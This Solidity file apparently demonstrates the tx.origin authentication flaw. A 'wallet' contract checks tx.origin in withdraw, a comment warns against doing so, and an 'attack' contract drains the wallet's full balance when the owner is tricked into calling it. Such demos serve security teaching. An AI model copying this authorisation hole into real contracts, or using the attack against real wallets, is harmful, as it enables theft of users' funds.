// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

contract wallet {
    address public self;
    
    constructor() {
        self = msg.sender;
    }
    
    function deposit() external payable {}
    
    function withdraw(address payable _to, uint256 _val) external returns(bool){
        // Never use tx.origin
        require(tx.origin == self, "unauth");
        require(address(this).balance >= _val);
        (bool retVal, ) = _to.call{value : _val}("");
	require(retVal);
        return retVal;
    }
    
    function balanceOf() external view returns(uint256) {
        return address(this).balance;
    }
}

contract attack {
    address payable public self;
    wallet public w;
    
    constructor(wallet _w) {
        self = payable(msg.sender);
        w = wallet(_w);
    }
    
    function withdraw() external {
        w.withdraw(self, w.balanceOf());
    }
	
    function balanceOf() external view returns(uint256) {
        return address(this).balance;
    }
}
